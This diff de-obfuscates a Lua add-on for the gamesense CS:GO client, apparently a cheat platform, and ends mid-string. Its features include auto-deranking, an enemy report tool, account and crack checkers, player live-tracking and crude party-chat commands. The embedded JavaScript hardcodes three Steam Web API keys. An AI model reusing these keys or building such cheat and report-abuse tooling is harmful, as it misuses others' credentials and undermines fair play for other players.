@@ -1,2788 +1,2996 @@
-﻿local var_0_0 = require("ffi")
-local var_0_1 = require("gamesense/csgo_weapons")
-local var_0_2 = require("gamesense/http")
-local var_0_3 = require("gamesense/steamworks")
-local var_0_4 = require("gamesense/panorama_events")
-local var_0_5 = require("gamesense/clipboard")
-local var_0_6 = panorama.open()
-local var_0_7 = var_0_6["$"]
-local var_0_8 = var_0_6.CompetitiveMatchAPI
-local var_0_9 = var_0_6.GameStateAPI
-local var_0_10 = var_0_6.FriendsListAPI
-local var_0_11 = var_0_6.GameTypesAPI
-local var_0_12 = var_0_6.PartyListAPI
-local var_0_13 = var_0_6.MyPersonaAPI
-local var_0_14 = var_0_6.LobbyAPI
-local var_0_15 = var_0_6.SteamOverlayAPI
-local var_0_16 = var_0_6.TeammatesAPI
-local var_0_17 = var_0_3.ISteamFriends
-local var_0_18 = {
-	items = {}
-}
-local var_0_19 = database.read("cplua_overrides") or {}
+--[[
+                           _   _     __    ___    _____                             __  
+                          (_) | |   /_ |  / _ \  | ____|                           / /
+   ___   ___   _ __ ___    _  | |_   | | | (_) | | |__         _ __ ___   ___     / / 
+  / __| / __| | '_ ` _ \  | | | __|  | |  \__, | |___ \       | '_ ` _ \ / _ \   / /  
+ | (__  \__ \ | | | | | | | | | |_   | |    / /   ___) |  _   | | | | | |  __/  / /   
+  \___| |___/ |_| |_| |_| |_|  \__|  |_|   /_/   |____/  (_)  |_| |_| |_|\___| /_/    
+   
+   
+    Script Name: Chris's Public Script (CP)
+    Script Author: csmit195
+    Script Version: 1.0
+    Script Description: A soon to be public lua for all of man kind.
+]]
 
-function var_0_18.new(arg_1_0, arg_1_1)
-	local var_1_0 = {
-		name = arg_1_0,
-		state = arg_1_1
-	}
+local ffi = require 'ffi'
+local csgo_weapons = require 'gamesense/csgo_weapons'
+local http = require 'gamesense/http'
+local steamworks = require 'gamesense/steamworks'
+local panorama_events = require 'gamesense/panorama_events'
 
-	if var_0_19[arg_1_0] then
-		var_1_0.state = false
+local js = panorama.open()
+local _ = js['$']
+local CompetitiveMatchAPI = js.CompetitiveMatchAPI
+local GameStateAPI = js.GameStateAPI
+local FriendsListAPI = js.FriendsListAPI
+local GameTypesAPI = js.GameTypesAPI
+local PartyListAPI = js.PartyListAPI
+local MyPersonaAPI = js.MyPersonaAPI
+local LobbyAPI = js.LobbyAPI
+local SteamOverlayAPI = js.SteamOverlayAPI
+local TeammatesAPI = js.TeammatesAPI
+
+local ISteamFriends = steamworks.ISteamFriends
+
+--#region Feature Overrides
+local Feature = {items = {}}
+local DisableOverride = database.read('cplua_overrides') or {}
+function Feature.new(FeatureName, State)
+	local object = {}
+	object.name = FeatureName
+	
+	object.state = State
+	if ( DisableOverride[FeatureName] ) then
+		object.state = false
 	end
 
-	var_0_18.items[arg_1_0] = var_1_0
-
-	return var_1_0
+	Feature.items[FeatureName] = object
+	return object
 end
 
-function var_0_18.get(arg_2_0)
-	return var_0_18.items[arg_2_0].state
+function Feature.get(FeatureName)
+	return Feature.items[FeatureName].state
 end
 
-var_0_18.new("Panorama Libraries", true)
-var_0_18.new("LiveCheck Library", true)
-var_0_18.new("Delayed Auto Accept", true)
-var_0_18.new("Delayed Connect", true)
-var_0_18.new("Auto Accept Detection", true)
-var_0_18.new("Auto Derank Score", true)
-var_0_18.new("Auto Open CsgoStats.gg", false)
-var_0_18.new("Auto Invite Recents", true)
-var_0_18.new("Match Start Beep", true)
-var_0_18.new("Custom Clantag Builder", true)
-var_0_18.new("Custom Killsay Builder", true)
-var_0_18.new("Report Enemy Tool", true)
-var_0_18.new("Account Checkers", true)
-var_0_18.new("Crack Checker", false)
-var_0_18.new("Faceit Checker", true)
-var_0_18.new("Game Value", true)
-var_0_18.new("Inventory Value", true)
-var_0_18.new("Banned Friends", true)
-var_0_18.new("Name History", true)
-var_0_18.new("CSGOStats.gg", true)
-var_0_18.new("Whitelist Friends on Key", true)
-var_0_18.new("Playerlist Additions", true)
-var_0_18.new("Highlight Targets", true)
-var_0_18.new("Dev Report Bot", true)
-var_0_18.new("Party Chat Utils", true)
-var_0_18.new("Chat Commands", true)
-var_0_18.new("Raw Chat Print", true)
-var_0_18.new("User Data Saving", true)
+Feature.new('Panorama Libraries', true) -- Very broad, will break a lot to disable
+Feature.new('LiveCheck Library', true)
 
-local var_0_20
-local var_0_21 = {}
-local var_0_22 = {
+Feature.new('Delayed Auto Accept', true)
+Feature.new('Delayed Connect', true)
+Feature.new('Auto Accept Detection', true)
+Feature.new('Auto Derank Score', true)
+Feature.new('Auto Open CsgoStats.gg', false)
+Feature.new('Auto Invite Recents', true)
+Feature.new('Match Start Beep', true)
+Feature.new('Custom Clantag Builder', true)
+Feature.new('Custom Killsay Builder', true)
+Feature.new('Report Enemy Tool', true)
+
+Feature.new('Account Checkers', true)
+Feature.new('Crack Checker', false)
+Feature.new('Faceit Checker', true)
+Feature.new('Game Value', true)
+Feature.new('Inventory Value', true)
+Feature.new('Banned Friends', true)
+Feature.new('Name History', true)
+
+Feature.new('Whitelist Friends on Key', true)
+Feature.new('Playerlist Additions', true)
+Feature.new('Highlight Targets', true)
+Feature.new('Party Chat Utils', true)
+
+Feature.new('Raw Chat Print', true)
+Feature.new('User Data Saving', true)
+--#endregion Feature Overrides
+
+local lolz_data
+local PListAdditions = {}
+
+-- Options
+local Options = {
 	debugMode = false
 }
 
-if var_0_18.get("Panorama Libraries") then
-	CPPanoramaMainMenu = panorama.loadstring("\t\t$.Schedule(5, $.Msg, 'test')\n\n\t\t// Lobby Chat Utils\n\t\tlet Prefix = '!';\n\t\tlet MsgSteamID = false;\n\t\tlet MySteamID = MyPersonaAPI.GetXuid();\n\t\tlet UserData = {};\n\t\tlet MuteUsers = [];\n\n\t\tconst Utilities = {};\n\n\t\tUtilities.IsBlacklisted = (SteamXUID) => {\n\t\t\tUserData.blacklist = UserData.blacklist || [0];\n\t\t\treturn UserData.blacklist.includes(SteamXUID)\n\t\t}\n\n\t\tUtilities.SayParty = (Message) => {\n\t\t\tlet FilteredMessage = Message.split(' ').join('\\u{00A0}');\n\t\t\tPartyListAPI.SessionCommand('Game::Chat', `run all xuid ${MySteamID} chat ${FilteredMessage}`);\n\t\t}\n\n\t\tlet Keys = [\n\t\t\t'5DA40A4A4699DEE30C1C9A7BCE84C914',\n\t\t\t'5970533AA2A0651E9105E706D0F8EDDC',\n\t\t\t'2B3382EBA9E8C1B58054BD5C5EE1C36A'\n\t\t];\n\t\tlet KeyIndex = 0\n\t\tUtilities.RandomWebKey = () => {\n\t\t\tif ( KeyIndex >= Keys.length ) KeyIndex = 0;\n\t\t\treturn Keys[KeyIndex++]\n\t\t}\n\n\t\t/*\n\t\tfunction resolveVanityURL(vanityurl, callback)\n\t\t\thttp.get('https://api.steampowered.com/ISteamUser/ResolveVanityURL/v1?key=' .. Utilities.RandomWebKeyhttp .. '&vanityurl=' .. vanityurl, function(success, response)\n\t\t\t\tif not success or response.status ~= 200 then return callback(false) end\n\t\t\n\t\t\t\tlocal data = json.parse(response.body)\n\t\t\t\tif data then\n\t\t\t\t\tif not data.response.success == 1 or not data.response.steamid then return callback(false) end\n\t\t\t\t\treturn callback(data.response.steamid)\n\t\t\t\tend\n\t\t\t\treturn callback(false)\n\t\t\tend)\n\t\tend\n\t\t*/\n\n\t\tUtilities.resolveVanityURL = (vanityurl, callback) => {\n\t\t\t$.AsyncWebRequest('https://api.steampowered.com/ISteamUser/ResolveVanityURL/v1?key=' + Utilities.RandomWebKey() + '&vanityurl=' + vanityurl, {\n\t\t\t\ttype:\"GET\",\n\t\t\t\tcomplete:function(e){\n\t\t\t\t\tif ( e.status != 200 ) return;\n\t\t\t\t\tlet Response = e.responseText.substring(0, e.responseText.length-1);\n                    let Data = JSON.parse(Response);\n\t\t\t\t\tif ( Data.response.success ) {\n\t\t\t\t\t\tcallback(Data.response.steamid)\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\n\t\tUtilities.FindPlayer = (str, NoOutput, callback) => {\n\t\t\tlet FoundXUID = false;\n\n\t\t\t// Type Checks\n\t\t\tlet regex_steamid64 = /(765\\d{14})/i;\n\t\t\tlet regex_steamid3 = / /i; // idk yet bud, maths is dumb\n\t\t\tlet regex_friendcode = /(\\w{5}-\\w{4})/i;\n\t\t\tlet regex_lobbyindex = /\\d{1}$/i\n\t\t\tlet regex_url = /steamcommunity.com\\/id\\/(.+)$/i;\n\n\t\t\tif ( regex_steamid64.test(str) ) {\n\t\t\t\tFoundXUID = str.match(regex_steamid64)[0];\n\t\t\t} else if ( regex_steamid3.test(str) ) {\n\n\t\t\t} else if ( regex_friendcode.test(str) ) {\n\t\t\t\tFoundXUID = FriendsListAPI.GetXuidFromFriendCode(str.match(regex_friendcode)[0]);\n\t\t\t} else if ( regex_lobbyindex.test(str) ) {\n\t\t\t\tlet LobbyIndex = str.match(regex_lobbyindex)[0]\n\t\t\t\tFoundXUID = PartyListAPI.GetXuidByIndex(LobbyIndex - 1);\n\t\t\t} else if ( regex_url.test(str) && callback ) {\n\t\t\t\tlet vanityURL = str.match(regex_url)[1].replace(/\\/$/, \"\")\n\t\t\t\tUtilities.resolveVanityURL(vanityURL, (steamid)=>{\n\t\t\t\t\tcallback(steamid)\n\t\t\t\t});\n\t\t\t} else if ( typeof str == 'string' ) {\n\t\t\t\tlet TempID;\n\t\t\t\tlet TempCount = 0;\n\t\t\t\tfor ( i=0; i<PartyListAPI.GetCount(); i++ ) {\n\t\t\t\t\tlet MemberSteamID = PartyListAPI.GetXuidByIndex(i);\n\t\t\t\t\tlet MemberName = PartyListAPI.GetFriendName(MemberSteamID);\n\t\t\t\t\tif ( MemberName.toLowerCase().indexOf(str.toLowerCase()) == 0 ) {\n\t\t\t\t\t\tTempID = MemberSteamID;\n\t\t\t\t\t\tTempCount++;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( TempCount == 1 ) {\n\t\t\t\t\tFoundXUID = TempID;\n\t\t\t\t} else if ( !NoOutput ) {\n\t\t\t\t\tUtilities.SayParty(`Found ${TempCount} matches for \"${str}\", try being more specific!`)\n\t\t\t\t}\n\t\t\t}\n\t\t\tif ( FoundXUID ) {\n\t\t\t\tif ( callback ) callback(FoundXUID);\n\t\t\t\treturn FoundXUID\n\t\t\t}\n\t\t}\n\n\t\tUtilities.MessageHistory = [];\n\n\t\tfunction AttachHistory() {\n\t\t\tlet elInput = $.GetContextPanel().FindChildTraverse('ChatInput');\n\n\t\t\tlet ChatPanelContainer = $.GetContextPanel().FindChildTraverse('ChatPanelContainer');\n\t\t\t\n\t\t\tif ( ChatPanelContainer && elInput ) {\n\t\t\t\tlet Root = ChatPanelContainer.GetParent();\n\n\t\t\t\telInput.ClearPanelEvent('oninputsubmit');\n\n\t\t\t\telInput.SetPanelEvent( 'onfocus', ()=>{\n\t\t\t\t});\n\n\t\t\t\tUtilities.ClearMessageIndex = ()=>{\n\t\t\t\t\tUtilities.MessageIndex = Utilities.MessageHistory.length;\n\t\t\t\t}\n\n\t\t\t\telInput.SetPanelEvent( 'oninputsubmit', ()=>{\n\t\t\t\t\tlet Msg = elInput.text;\n\t\t\t\t\tif ( Msg != '' ) {\n\t\t\t\t\t\tUtilities.MessageHistory.push(Msg);\n\t\t\t\t\t\tUtilities.ClearMessageIndex();\n\t\t\t\t\t}\n\t\t\t\t\telInput.text = Msg.replace(/@[0-9\\w-]+/ig, (match, capture)=>{\n\t\t\t\t\t\tlet FoundXUID = Utilities.FindPlayer(match.substring(1), true)\n\t\t\t\t\t\tif ( FoundXUID ) {\n\t\t\t\t\t\t\treturn PartyListAPI.GetFriendName(FoundXUID)\n\t\t\t\t\t\t}\n\t\t\t\t\t\treturn match\n\t\t\t\t\t});\n\t\t\t\t\tRoot.SubmitChatText()\n\t\t\t\t\telInput.text = \"\";\n\t\t\t\t});\n\t\t\t}\n\t\t}\n\n\t\tAttachHistory()\n\n\t\t$.RegisterForUnhandledEvent(\"PanoramaComponent_Lobby_MatchmakingSessionUpdate\", function(state){\n\t\t\tif(state == 'updated' && PartyListAPI.IsPartySessionActive()){\n\t\t\t\tAttachHistory();\n\t\t\t}\n\t\t});\n\n\t\tlet PartyChatCommands = [];\n\t\t\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Help (!\\u{200B}help)',\n\t\t\tcmds: ['help', 'h'],\n\t\t\ttimeout: 2500,\n\t\t\texec: (cmd, args, sender, steamid) => {\n \t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tif ( args.length == 0 ) {\n\t\t\t\t\tfor ( i=1; i<PartyChatCommands.length; i++ ) {\n\t\t\t\t\t\tlet ChatCommand = PartyChatCommands[i];\n\t\t\t\t\t\tif (ChatCommand.cmds[0] == 'sus')\n\t\t\t\t\t\t\tcontinue;\n\t\t\t\t\t\tconst Title = `» ${ChatCommand.title}`;\n\t\t\t\t\t\tconst Alias = ChatCommand.cmds;\n\t\t\t\t\t\tUtilities.SayParty(Title);\n\t\t\t\t\t}\n\t\t\t\t} else {\n\t\t\t\t\tfor ( i=1; i<PartyChatCommands.length; i++ ) {\n\t\t\t\t\t\tlet ChatCommand = PartyChatCommands[i];\n\t\t\t\t\t\tif (ChatCommand.cmds[0] == 'sus')\n\t\t\t\t\t\t\tcontinue;\n\n\t\t\t\t\t\tconst Alias = ChatCommand.cmds;\n\t\t\t\t\t\tconst FoundAlias = Alias.find(item => item == args[0]);\n\t\t\t\t\t\tif ( FoundAlias ) {\n\t\t\t\t\t\t\tconst AliasString = Alias.join(', ');\n\t\t\t\t\t\t\tconst Title = `» List of Alias's: ${AliasString}`;\n\t\t\t\t\t\t\tUtilities.SayParty(Title);\n\t\t\t\t\t\t\tbreak;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Test (!\\u{200B}test)',\n\t\t\tcmds: ['test'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tUtilities.SayParty(`Test successful, sender info: ${sender} | ${steamid}`)\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Sus (!\\u{200B}Displays a sus Lua Coder)',\n\t\t\tcmds: ['sus'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\n\t\t\t\t// todo: sus stuff below\n\t\t\t\tUtilities.SayParty(`${sender} did you know csmit is a sussy baka? >w<`)\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Start Queue (!\\u{200B}startq)',\n\t\t\tcmds: ['start', 'startq', 'startqueue', 'queue', 'q'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tif ( !LobbyAPI.BIsHost() ) return;\n\t\t\t\t\n\t\t\t\tLobbyAPI.StartMatchmaking(\tMyPersonaAPI.GetMyOfficialTournamentName(),\n\t\t\t\t\tMyPersonaAPI.GetMyOfficialTeamName(),\n\t\t\t\t\t'',\n\t\t\t\t\t''\n\t\t\t\t);\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Stop Queue (!\\u{200B}stopq)',\n\t\t\tcmds: ['stop', 'stopq', 'stopqueue', 'sq', 's'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tLobbyAPI.StopMatchmaking()\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Restart Queue (!\\u{200B}restartq)',\n\t\t\tcmds: ['restart', 'restartq', 'restartqueue', 'rs'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tif ( !LobbyAPI.BIsHost() ) return;\n\t\t\t\tLobbyAPI.StopMatchmaking()\n\t\t\t\t$.Schedule(1, ()=>{\n\t\t\t\t\t/*let settings = LobbyAPI.IsSessionActive() ? LobbyAPI.GetSessionSettings() : null;\n\t\t\t\t\tlet stage = '';\n\t\t\t\t\tif ( settings && settings.game && settings.options\n\t\t\t\t\t\t&& settings.options.server !== 'listen'\n\t\t\t\t\t\t&& settings.game.mode === 'competitive'\n\t\t\t\t\t\t&& settings.game.mapgroupname.includes( 'mg_lobby_mapveto' ) ) {\n\t\t\t\t\t\tstage = '';\n\t\t\t\t\t}*/\n\n\t\t\t\t\tLobbyAPI.StartMatchmaking(\tMyPersonaAPI.GetMyOfficialTournamentName(),\n\t\t\t\t\t\tMyPersonaAPI.GetMyOfficialTeamName(),\n\t\t\t\t\t\t'',\n\t\t\t\t\t\t''\n\t\t\t\t\t);\n\t\t\t\t});\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Posts a random chuck norris fact (!\\u{200B}chucknorris)',\n\t\t\tcmds: ['cfact', 'fact', 'chucknorris'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\t$.AsyncWebRequest('https://api.chucknorris.io/jokes/random', {\n\t\t\t\t\ttype:\"GET\",\n\t\t\t\t\tcomplete:function(e){\n\t\t\t\t\t\tif ( e.status != 200 ) return;\n\t\t\t\t\t\tlet Response = e.responseText.substring(0, e.responseText.length-1);\n\t\t\t\t\t\tlet Data = JSON.parse(Response);\n\t\t\t\t\t\tif ( Data ) {\n\t\t\t\t\t\t\tUtilities.SayParty(Data.value)\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Reset Lobby (!\\u{200B}resetlobby)',\n\t\t\tcmds: ['resetlobby', 'relobby', 'rl'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\n\t\t\t\tlet Settings = LobbyAPI.GetSessionSettings();\n\t\t\t\tlet GameMode = Settings.game.mode;\n\t\t\t\tlet GameType = Settings.game.type;\n\t\t\t\tlet MapGroupName = Settings.game.mapgroupname;\n\t\t\t\tlet MySteamID = MyPersonaAPI.GetXuid();\n\n\t\t\t\tif ( steamid != MySteamID ) return;\n\n\t\t\t\t// Get Lobby Players\n\t\t\t\tlet SteamIDs = [];\n\t\t\t\tfor ( i=0; i<Settings.members.numMachines; i++ ) {\n\t\t\t\t\tlet Player = Settings.members[`machine${i}`];\n\t\t\t\t\tlet PlayerSteamID = Player.id;\n\n\t\t\t\t\tif ( MySteamID != PlayerSteamID ) {\n\t\t\t\t\t\tSteamIDs.push(PlayerSteamID)\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tLobbyAPI.CloseSession();\n\n\t\t\t\tfor ( i=0; i<SteamIDs.length; i++ ) {\n\t\t\t\t\tFriendsListAPI.ActionInviteFriend(SteamIDs[i], '');\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Maps (!\\u{200B}maps dust2, safehouse)',\n\t\t\tcmds: ['maps', 'map', 'setmaps', 'changemap', 'changemaps'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tif ( !UserData.mods.indexOf(steamid) ) return;\n\t\t\t\tif ( !LobbyAPI.BIsHost() ) return;\n\t\t\t\t\n\t\t\t\tlet Config = GameTypesAPI.GetConfig();\n\t\t\t\tlet SessionSettings = LobbyAPI.GetSessionSettings();\n\t\t\t\tlet GameMode = SessionSettings.game.mode;\n\t\t\t\tlet GameType = SessionSettings.game.type;\n\n\t\t\t\tlet MapsInGroup = Config.gameTypes[GameType].gameModes[GameMode].mapgroupsMP;\n\t\t\t\tlet MapList = [];\n\n\t\t\t\tif ( args[0] == 'all' ) {\n\t\t\t\t\tdelete MapsInGroup['mg_lobby_mapveto'];\n\t\t\t\t\tMapList = Object.keys(MapsInGroup)\n\t\t\t\t} else {\n\t\t\t\t\tlet Maps = args.join(',').split(',');\n\t\t\t\t\tlet FilteredMaps = [];\n\t\t\t\t\tMaps.forEach((map, index)=>{\n\t\t\t\t\t\tif ( map.trim() != '' ) {\n\t\t\t\t\t\t\tFilteredMaps.push(map)\n\t\t\t\t\t\t}\n\t\t\t\t\t});\n\n\t\t\t\t\tlet FoundMaps = {};\n\t\t\t\t\tFilteredMaps.forEach((SearchMap, key)=>{\n\t\t\t\t\t\tfor (Map in MapsInGroup) {\n\t\t\t\t\t\t\tlet MapName = GameTypesAPI.GetFriendlyMapName(Map.substr(3));\n\t\t\t\t\t\t\tif ( Map.indexOf('scrimmage') == -1 && ( MapName.toLowerCase().indexOf(SearchMap.trim().toLowerCase()) != -1 || Map.toLowerCase().search(SearchMap.toLowerCase()) != -1 ) ) {\n\t\t\t\t\t\t\t\tFoundMaps[Map] = true;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t} \n\t\t\t\t\t});\n\t\t\t\t\t\n\t\t\t\t\tfor ( Map in FoundMaps ) {\n\t\t\t\t\t\tMapList.push(Map);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\tif ( MapList.length > 0 ) {\n\t\t\t\t\tPartyListAPI.UpdateSessionSettings(`Update/Game/mapgroupname ${MapList}`);\n\t\t\t\t} \n\t\t\t}\n\t\t});\n\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Gamemode (!\\u{200B}mode wm)',\n\t\t\tcmds: ['mode', 'gm', 'gamemode', 'mm', 'wm'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tif ( !LobbyAPI.BIsHost() ) return;\n\n\t\t\t\tlet SessionSettings = LobbyAPI.GetSessionSettings();\n\t\t\t\tlet GameMode = SessionSettings.game.mode;\n\t\t\t\tlet GameType = SessionSettings.game.type;\n\n\t\t\t\tlet settings = { update : { Game: { } } }\n\n\t\t\t\t// I would use a switch case, but I want to do regex\n\t\t\t\tif ( cmd == 'mm' || ( args.length > 0 && /(comp.*|5(x|v)5|mm)/i.test(args[0]) ) ) {\n\t\t\t\t\tsettings.update.Game.mode = 'competitive'\n\t\t\t\t\tsettings.update.Game.type = 'classic'\n\t\t\t\t} else if ( cmd == 'wm' || ( args.length > 0 && /(wing.*|2(x|v)2|wm)/i.test(args[0]) ) ) {\n\t\t\t\t\tsettings.update.Game.mode = 'scrimcomp2v2'\n\t\t\t\t\tsettings.update.Game.type = 'classic'\n\t\t\t\t}\n\n\t\t\t\tLobbyAPI.UpdateSessionSettings( settings );\n\t\t\t}\n\t\t});\n\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'clearchat (!\\u{200B}clearchat)',\n\t\t\tcmds: ['clearchat', 'clear', 'cc', 'cl', 'deletechat', 'delchat', 'deletechat'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( steamid != MyPersonaAPI.GetXuid() ) return;\n\n\t\t\t\tlet party_chat = $.GetContextPanel().FindChildTraverse(\"PartyChat\")\n\t\t\t\tif(party_chat) {\n\t\t\t\t\tlet chat_lines = party_chat.FindChildTraverse(\"ChatLinesContainer\")\n\t\t\t\t\tif(chat_lines) {\n\t\t\t\t\t\t//chat_lines.RemoveAndDeleteChildren();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Kick (!\\u{200B}kick <partial:name>|<steamid>|<friendcode>)',\n\t\t\tcmds: ['kick'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tif ( !LobbyAPI.BIsHost() ) return;\n\t\t\t\tif ( steamid != LobbyAPI.GetHostSteamID() && !UserData.mods.indexOf(steamid) ) return;\n\n\t\t\t\tUserData.mods = UserData.mods || [0];\n\n\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\tlet KickXUID = Utilities.FindPlayer(args[0]);\n\t\t\t\t\tif ( KickXUID && LobbyAPI.GetHostSteamID() != KickXUID && LobbyAPI.IsPartyMember(KickXUID) ) {\n\t\t\t\t\t\tLobbyAPI.KickPlayer(KickXUID);\n\t\t\t\t\t\tlet Name = FriendsListAPI.GetFriendName(KickXUID);\n\t\t\t\t\t\tUtilities.SayParty(`Kicked ${Name} (${KickXUID}) from the lobby!`);\n\t\t\t\t\t} else if ( LobbyAPI.GetHostSteamID() == KickXUID ) {\n\t\t\t\t\t\tUtilities.SayParty(`You are unable to kick the host!`);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t\t\n\t\tRandNumber = 3\n\t\tPartyChatCommands.push({\n            title: 'Roll a number between 1 and 6 (!\\u{200B}roll)',\n            cmds: ['roll'],\n            exec: (cmd, args, sender, steamid) => {\n                if ( Utilities.IsBlacklisted(steamid) ) return;\n                let currentNumber = Math.floor(Math.random() * (6-1)) + 1;\n                if (currentNumber == 1 && currentNumber == RandNumber) {\n                    Utilities.SayParty(`${sender} rolled a ${currentNumber} ... snake eyes!`)\n                } else {\n                    Utilities.SayParty(`${sender} rolled a ${currentNumber}`)\n\t\t\t\t}\n                RandNumber = currentNumber;\n            }\n        });\n\n\t\tPartyChatCommands.push({\n            title: 'Am i gay?! (!\\u{200B}gay)',\n            cmds: ['gay'],\n            exec: (cmd, args, sender, steamid) => {\n                if ( Utilities.IsBlacklisted(steamid) ) return;\n                let currentNumber = Math.floor(Math.random() * (2-0)) + 1;\n\t\t\t\tif (currentNumber == 2) {\n                    Utilities.SayParty(`${sender} is gay`)\n\t\t\t\t} else {\n                    Utilities.SayParty(`${sender} is not gay`)\n\t\t\t\t}\n                RandNumber = currentNumber;\n            }\n        });\n\n\t\tPartyChatCommands.push({\n            title: 'Invades Issue??',\n            cmds: ['invades'],\n            exec: (cmd, args, sender, steamid) => {\n                if ( Utilities.IsBlacklisted(steamid) ) return;\n                Utilities.SayParty(`issue`)\n            }\n        });\n\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'check how much the person loves you! (!\\u{200B}lovecalc <partial:name>|<steamid>|<friendcode>)',\n\t\t\tcmds: ['lovecalc', 'lc', 'love'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tUserData.mods = UserData.mods || [0];\n\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\tlet LoveXUID = Utilities.FindPlayer(args[0]);\n\t\t\t\t\tif ( LoveXUID && LobbyAPI.GetHostSteamID() ) {\n\t\t\t\t\t\tlet Name = FriendsListAPI.GetFriendName(LoveXUID);\n\t\t\t\t\t\tlet currentNumber = ((Number(LoveXUID.substr(3)) + Number(steamid.substr(3)) + 8) % 100) + 1;\n\t\t\t\t\t\tif (currentNumber == 69 && RandNumber)\n\t\t\t\t\t\tUtilities.SayParty(`${Name} loves ${sender} to ${currentNumber}% Nice, haha funny number!`);\n\t\t\t\t\telse\n\t\t\t\t\t\tUtilities.SayParty(`${Name} loves ${sender} to ${currentNumber}%`);\n\t\t\t\t\t\tRandNumber = currentNumber;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'check your pp size or someone elses! (!\\u{200B}ppsize <partial:name>|<steamid>|<friendcode>)',\n\t\t\tcmds: ['ppsize', 'pp'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\t\t\t\tUserData.mods = UserData.mods || [0];\n\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\tlet funnypp = Utilities.FindPlayer(args[0]);\n\t\t\t\t\tif ( funnypp && LobbyAPI.GetHostSteamID() ) {\n\t\t\t\t\t\tlet Name = FriendsListAPI.GetFriendName(funnypp);\n\t\t\t\t\t\tlet currentNumber = Math.floor(Math.random() * (30-1)) +1;\n\t\t\t\t\t\tif (currentNumber == 1 && RandNumber)\n\t\t\t\t\t\tUtilities.SayParty(`${Name}'s pp is ${currentNumber}cm >w< so cute`);\n\t\t\t\t\telse\n\t\t\t\t\t\tUtilities.SayParty(`${Name}'s pp is ${currentNumber}cm long`);\n\t\t\t\t\t\tRandNumber = currentNumber;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\tPartyChatCommands.push({\n\t\t\ttitle: 'Check (!\\u{200B}Check <steamid>|<friendcode>)',\n\t\t\tcmds: ['check'],\n\t\t\texec: (cmd, args, sender, steamid) => {\n\t\t\t\tif ( Utilities.IsBlacklisted(steamid) ) return;\n\n\t\t\t\tif ( typeof args[0] != 'undefined' ) {\n\t\t\t\t\tUtilities.FindPlayer(args[0], false, (steamid)=>{\n\t\t\t\t\t\tlet Name = FriendsListAPI.GetFriendName(steamid);\n\t\t\t\t\t\tUtilities.SayParty('[LiveCheck] Please wait 5 seconds. Checking...');\n\t\t\t\t\t\tLiveCheck.start(steamid, (data)=>{\n\t\t\t\t\t\t\tlet msg = '[LiveCheck] ';\n\t\t\t\t\t\t\tif ( data ) { \n\t\t\t\t\t\t\t\tmsg += `${Name} is in-${data.state} `\n\t\t\t\t\t\t\t\tif ( data.state == 'lobby' ) {\n\t\t\t\t\t\t\t\t\tmsg += 'queuing 